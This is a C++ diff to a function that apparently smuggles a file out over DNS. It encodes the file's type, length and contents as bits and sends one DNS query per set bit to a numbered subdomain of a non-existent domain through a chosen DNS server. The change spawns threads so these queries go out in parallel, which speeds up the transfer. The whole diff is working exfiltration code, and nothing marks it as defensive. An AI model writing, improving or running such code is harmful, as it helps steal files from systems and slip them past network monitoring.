@@ -7,6 +7,8 @@
 #include <unordered_map>
 #include <cstdint>
 #include <chrono>
+#include <thread>
+#include <vector>
 #include "extension_map.h"
 using namespace std;
 
@@ -72,17 +74,26 @@ bool send_message(string filename, string nxdomain, string dns_server){
 
     // Step1: Send type (8-bit) 
     bitset<8> b_type(type[0]);
+    vector<thread> workers;
+    workers.reserve(b_type.size());
+    
     for (size_t i = 0; i < b_type.size(); i++) {
         DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
         if (b_type[i] == 1) {
             string query_domain = to_string(i) + "." + nxdomain;         
-            transmit(query_domain, dns_server);
+            workers.emplace_back([query_domain, &dns_server]{
+                transmit(query_domain, dns_server);
+            });
         }
     }
+
+    for (auto &t: workers) t.join();
 
     // Step2: Send length (24-bit) 
     for (size_t i = 0; i < 3; i++) {
         bitset<8> b_length(length[i]);
+        vector<thread> workers;
+        workers.reserve(b_length.size());
         DEBUG_COUT(cout << "===================\n" 
              << "length[" << i << "]: " << length[i] << "  "
              << "b_length holds " << b_length << endl;);
@@ -91,14 +102,20 @@ bool send_message(string filename, string nxdomain, string dns_server){
             if (b_length[j] == 1) {
                 int index = 8 + i*8 + j;
                 string query_domain = to_string(index) + "." + nxdomain;
-                transmit(query_domain, dns_server);
+                workers.emplace_back([query_domain, &dns_server]{
+                    transmit(query_domain, dns_server);
+                });
             }
         }
+
+        for (auto &t: workers) t.join();
     }
 
     // Step3: Send value
     for (size_t i = 0; i < size; i++) {
         bitset<8> bits(value[i]);
+        vector<thread> workers;
+        workers.reserve(bits.size());
         DEBUG_COUT(cout << "===================\n"
              << "value[" << i << "]: " << value[i] << "  "
              << "bits holds " << bits << endl;);
@@ -107,9 +124,13 @@ bool send_message(string filename, string nxdomain, string dns_server){
             if (bits[j] == 1) {
                 int index = 32 + i*8 + j;
                 string query_domain = to_string(index) + "." + nxdomain;
-                transmit(query_domain, dns_server);
+                workers.emplace_back([query_domain, &dns_server]{
+                    transmit(query_domain, dns_server);
+                });
             }
         }
+
+        for (auto &t: workers) t.join();
     }
        
     // free memory
